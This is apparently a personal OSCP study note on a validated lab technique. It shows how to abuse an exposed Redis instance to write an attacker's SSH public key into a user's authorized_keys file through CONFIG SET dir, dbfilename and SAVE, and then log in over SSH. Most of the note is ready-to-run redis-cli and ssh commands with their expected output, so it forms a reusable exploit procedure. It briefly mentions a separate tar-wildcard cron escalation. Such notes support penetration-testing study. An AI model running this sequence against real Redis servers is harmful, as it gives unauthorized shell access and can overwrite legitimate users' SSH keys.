---
type: reusable-poc
project: OSCP-Exam-PoC
status: validated
updated: "2026-11-07"
related_machines:
  - HA-01
tags:
  - oscp
  - redis
  - rdb
  - ssh
  - authorized-keys
  - initial-access
---

# Redis RDB-to-SSH Key Injection

## 1. Overview

This technique abuses an exposed Redis instance to write a Redis database snapshot into an SSH user's `.ssh` directory.

Controlling the Redis persistence directory, database filename, and stored value allows an `authorized_keys` file to be created containing an SSH public key in a format OpenSSH can recognize.

The result is SSH access to the target account.

**Validated on HA-01:** Redis persistence was used to obtain an SSH foothold as `devops`.

### Attack chain

<figure class="poc-blueprint-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/poc-blueprint-redis-persistence-mobile.svg" />
    <img src="/diagrams/poc-blueprint-redis-persistence.svg" alt="REDIS PERSISTENCE reusable exploitation blueprint: Unauthenticated Redis then Redis administrative access then Identify an existing Linux account then Locate its .ssh directory then Confirm Redis can write there then Generate SSH key pair locally then Configure Redis persistence then Store newline-padded public key then SAVE -&gt; authorized_keys then SSH authentication then Linux user access. . ." width="960" height="834" loading="lazy" decoding="async" />
  </picture>
  <figcaption>REDIS PERSISTENCE — technical exploitation blueprint, preserving the original sequence. Supporting commands and evidence remain in this page.</figcaption>
</figure>

## 2. Requirements

|Requirement|Purpose|
|---|---|
|Redis access|Issue administrative Redis commands|
|`CONFIG SET` permission|Change persistence settings|
|`SAVE` permission|Force an RDB snapshot|
|Shared filesystem|Redis and SSH must see the same target directory|
|Writable `.ssh` directory|Allow Redis to create the persistence file|
|SSH service|Authenticate using the injected public key|
|Local SSH key pair|Keep the private key on the attacking machine|

This technique does not require the target to initiate a reverse TCP connection to Kali.

## 3. HA-01 Confirmed Conditions

|Property|Observed value|
|---|---|
|Redis host|`x.x.x.x`|
|Redis port|`PORT_G`|
|SSH port|`PORT_F`|
|Linux account|`devops`|
|SSH directory|`/home/devops/.ssh`|
|Redis initial directory|`/tmp`|
|Redis initial database filename|`dump.rdb`|

### Directory discovery

Redis was used to test candidate account directories through:

```
CONFIG SET dir /home/devops
```

Result:

```
OK
```

The SSH directory was then tested:

```
CONFIG SET dir /home/devops/.ssh
```

Result:

```
OK
```

This established directory accessibility, not necessarily write permission.

### Write-permission validation

A harmless RDB snapshot was created using a temporary filename:

```
CONFIG SET dir /home/devops/.ssh
CONFIG SET dbfilename ha01-write-probe.rdb
SAVE
```

Result:

```
OK
```

This confirmed that Redis could write an RDB file into the SSH directory.

The temporary persistence settings were then restored.

## 4. Exploitation

### Step 1 — Generate an SSH key pair on Kali

```
mkdir -p ~/Desktop/HA01-keys

ssh-keygen -t ed25519 \
  -f ~/Desktop/HA01-keys/devops \
  -N '' \
  -C 'HA01-devops'
```

Generated files:

```
~/Desktop/HA01-keys/
├── devops       # Private key
└── devops.pub   # Public key
```

The private key remains on Kali.

### Step 2 — Prepare the public-key value

Read the public key:

```
PUBKEY=$(cat ~/Desktop/HA01-keys/devops.pub)
```

Add newline padding:

```
KEY_CONTENT=$(printf '\n\n%s\n\n' "$PUBKEY")
```

The padding is important because Redis writes an RDB-formatted file, not a plain-text SSH key file.

OpenSSH processes authorized-key entries line by line and ignores lines that are not valid key entries. The padding helps place the public-key entry on its own line inside the generated file.

### Step 3 — Configure Redis persistence

Connect to Redis:

```
redis-cli -h x.x.x.x -p PORT_G
```

The equivalent Redis operations are:

```
CONFIG SET dir /home/devops/.ssh
CONFIG SET dbfilename authorized_keys
SET ha01_ssh_key "<NEWLINE-PADDED-PUBLIC-KEY>"
SAVE
```

The actual execution was performed from Kali using:

```
REDIS=x.x.x.x
PORT=PORT_G
RCLI=/usr/bin/redis-cli

PUBKEY=$(cat ~/Desktop/HA01-keys/devops.pub)
KEY_CONTENT=$(printf '\n\n%s\n\n' "$PUBKEY")

"$RCLI" -h "$REDIS" -p "$PORT" CONFIG SET dir /home/devops/.ssh

"$RCLI" -h "$REDIS" -p "$PORT" CONFIG SET dbfilename authorized_keys

"$RCLI" -h "$REDIS" -p "$PORT" SET ha01_ssh_key "$KEY_CONTENT"

"$RCLI" -h "$REDIS" -p "$PORT" SAVE
```

Expected final response:

```
OK
```

**Important:** Redis writes an RDB snapshot to the configured filename. This operation can overwrite an existing `authorized_keys` file and its contents. Use only in an authorized lab or environment where that impact is acceptable.

### Step 4 — Restore Redis persistence settings

After the snapshot, restore the original settings recorded during HA-01:

```
CONFIG SET dir /tmp
CONFIG SET dbfilename dump.rdb
```

For another target, record its original values before changing them and restore those exact values.

### Step 5 — Authenticate through SSH

From Kali:

```
ssh -i ~/Desktop/HA01-keys/devops \
  -p PORT_F \
  devops@x.x.x.x
```

Successful access provides a Linux shell under the target account.

Verify:

```
id
whoami
hostname
pwd
```

On HA-01, the resulting account was `devops`.

## 5. Troubleshooting

|Symptom|Likely issue|Investigation|
|---|---|---|
|`CONFIG SET dir` returns permission denied|Redis cannot access the directory|Check path existence and permissions|
|`CONFIG SET dir` returns no such file|Directory does not exist|Test the correct home and `.ssh` paths|
|`SAVE` fails|Redis cannot write the snapshot|Check directory write permissions and Redis persistence restrictions|
|SSH authentication fails|File content, ownership, permissions, or filesystem visibility may be wrong|Check the SSH account and authentication configuration|
|Redis reports `SAVE OK` but SSH rejects the key|Snapshot creation succeeded, but authentication did not|Do not treat RDB write success as SSH authentication success|

## 6. Operational Considerations

- Redis administrative access does not automatically mean Linux command execution.
    
- `CONFIG SET dir` success proves that Redis can access the directory, not that it can write there.
    
- A successful `SAVE` confirms RDB creation, not that SSH accepts the resulting file.
    
- The Redis and SSH services must share the relevant filesystem.
    
- The private key must remain on the attacking machine.
    
- Changing `dir` and `dbfilename` affects subsequent Redis snapshots. Restore the original settings after the operation.
    
- Do not assume the username, SSH port, Redis port, or directory structure will be identical on another target.
    

## 7. HA-01 Result

<badge color="success">Validated initial-access technique</badge>

The Redis persistence technique provided SSH access as:

```
devops
```

This avoided the unsuccessful replication callback approach and established the Linux foothold required by the challenge.

The next stage was privilege escalation through a separate vulnerability: root cron executing a tar command with an attacker-controlled wildcard in a writable spool directory.

That escalation is documented separately under the Linux privilege-escalation PoCs.

## Related Notes

- [[HA-01 Overview]]
    
- [[VPN Routing and Reverse Shells]]
    
- [[Linux Privilege Escalation]]